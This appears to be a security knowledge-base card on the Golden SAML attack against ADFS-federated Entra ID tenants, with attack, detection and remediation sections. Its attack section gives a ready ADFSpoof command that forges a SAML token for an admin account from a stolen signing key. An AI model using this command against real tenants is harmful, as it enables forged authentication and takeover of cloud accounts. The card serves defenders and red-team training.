# [CA-FORGE-001]: Golden SAML Cross-Tenant Attack

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORGE-001 |
| **MITRE ATT&CK v18.1** | [Forge Web Credentials: SAML Tokens (T1606.002)](https://attack.mitre.org/techniques/T1606/002/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Hybrid AD / Entra ID |
| **Severity** | **Critical** |
| **CVE** | **CVE-2021-26906** (Related) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This is the cloud equivalent of the Golden Ticket. If an attacker steals the ADFS Token Signing Key (CA-UNSC-019), they can forge a SAML token for any user (e.g., Global Admin). Because Entra ID trusts the on-prem ADFS to authenticate users, it accepts this forged token without performing any checks (including MFA). The attacker can also use this to pivot to *other* clouds (AWS) if they trust the same ADFS.
- **Attack Surface:** Federation Trust.
- **Business Impact:** **Cloud & Multi-Cloud Compromise**. Total control over Entra ID and any other Federated apps.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Possession of Token Signing Key.
- **Tools:**
    - [shuriken](https://github.com/mdsecactivebreach/shuriken)
    - [ADFSpoof](https://github.com/mandiant/ADFSpoof)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Forge Token**
```bash
python3 adfspoof.py -b <Base64Key> -s "http://adfs.target.com/adfs/services/trust" --server "login.microsoftonline.com" --upn "admin@target.com" --object-id "GUID"
```

**Step 2: Authenticate**
The tool outputs a SAML Response. Submit this to `login.microsoftonline.com` to receive an OAuth token.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `Federated` | Authentication successes where the token was seemingly issued by ADFS, but no corresponding log exists on the on-prem ADFS server (requires correlation). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **HSM:** Use HSM for Token Signing Keys (prevents theft).
*   **Cloud Auth:** Migrate from Federation (ADFS) to **Cloud Authentication** (PHS/PTA). This removes the trust in on-prem signing keys entirely.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-UNSC-019]
> **Next Logical Step:** [LAT-CLOUD-002]
